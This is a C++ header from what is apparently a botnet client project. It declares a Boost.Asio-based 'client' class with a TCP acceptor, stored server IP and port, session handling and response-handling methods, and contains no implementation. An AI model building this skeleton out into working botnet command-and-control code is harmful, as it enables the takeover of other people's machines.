#ifndef BOTNET_CLIENT_CLIENT_H
#define BOTNET_CLIENT_CLIENT_H

#include <unistd.h>

#include <algorithm>
#include <boost/asio.hpp>
#include <boost/asio/io_context.hpp>
#include <boost/bind/bind.hpp>
#include <chrono>
#include <cstdint>
#include <future>
#include <iostream>
#include <memory>
#include <optional>
#include <unordered_map>

#include "session.h"

namespace io = boost::asio;
using tcp = io::ip::tcp;
using err = boost::system::error_code;

class client {
    public:
	client(io::io_context &, std::uint16_t, std::string);
	void start();
	//
	// private:
	//
	void handleResponse(std::string &, session *);
	//    void send();
	//    long int generateId();
	//
	void accept();
	void onAccept(err error_code);
	//
	io::io_context &io_context;
	tcp::acceptor acceptor;
	std::optional<tcp::socket> socket_;
	std::string server_ip_;
	std::uint16_t server_port_;
	std::vector<std::shared_ptr<session>> tmp_vect_for_session_;
};

#endif	// BOTNET_CLIENT_CLIENT_H
